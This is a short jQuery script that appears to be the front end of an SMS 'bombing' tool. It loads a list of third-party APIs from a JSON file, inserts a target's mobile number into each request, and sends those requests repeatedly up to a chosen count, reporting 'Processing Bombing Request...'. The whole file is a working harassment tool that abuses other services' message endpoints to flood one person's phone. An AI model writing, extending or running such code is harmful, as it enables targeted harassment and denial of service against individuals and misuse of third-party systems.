$(document).ready(() => {

    $(document).on('click', '#send', function (e) {
        e.preventDefault();
        $('#logs').hide();
        var amount = parseInt($("#amount").val());
        var mobile = $("#mobile").val().replace(/^0/, "");

        if (amount > 0 && mobile.length === 10) {
            var c = 0;

            fetch("./assets/apigp.json")
                .then(r => r.json())
                .then(r => {
                    const APIS = r.apis;
                    console.log("APIS Loaded:", APIS);

                    while (c < amount) {
                        APIS.forEach(API => {
                            let config = {
                                url: API.url.replace("*****", mobile),
                                method: API.method,
                                headers: API.headers,
                                data: API.body ? API.body.replace("*****", mobile) : null
                            };
                            $.ajax(config)
                                .done(res => console.log("Success:", res))
                                .fail(err => console.log("Error:", err));
                            c += 1;
                        });
                    }

                    $('#logs').show().text("Processing Bombing Request...");
                }).catch(error => {
                    console.error('Error loading APIs:', error);
                    $('#logs').show().text("API লোডিংতে সমস্যা হয়েছে");
                });

        } else {
            $('#logs').show().text("Invalid Number or Amount is null");
        }
    });

});
